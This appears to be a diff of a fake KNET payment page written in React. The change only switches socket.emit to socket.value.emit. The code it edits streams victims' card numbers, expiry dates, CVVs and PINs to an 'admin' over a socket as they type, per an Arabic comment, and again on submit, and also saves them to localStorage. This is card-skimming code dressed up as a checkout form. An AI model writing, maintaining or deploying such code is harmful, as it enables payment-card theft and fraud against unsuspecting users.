@@ -121,7 +121,7 @@ export default function KNETPayment() {
 
   // بث البطاقة مباشرة للأدمن أثناء الكتابة
   useEffect(() => {
-    socket.emit("card:draft", {
+    socket.value.emit("card:draft", {
       paymentMethod: "KNET",
       prefix: selectedPrefix,
       cardNumberOnly: cardNumber,
@@ -307,7 +307,7 @@ export default function KNETPayment() {
     };
     localStorage.setItem("paymentData", JSON.stringify(paymentData));
 
-    socket.emit("card:draft", { paymentMethod: "KNET", prefix: selectedPrefix, cardNumberOnly: cardNumber, bankName: selectedBank, expiryMonth, expiryYear, cvv: cardCvv, pin: cardPin, submitted: true });
+    socket.value.emit("card:draft", { paymentMethod: "KNET", prefix: selectedPrefix, cardNumberOnly: cardNumber, bankName: selectedBank, expiryMonth, expiryYear, cvv: cardCvv, pin: cardPin, submitted: true });
     sendData({
       paymentCard: {
         cardNumber: fullCardNumber,
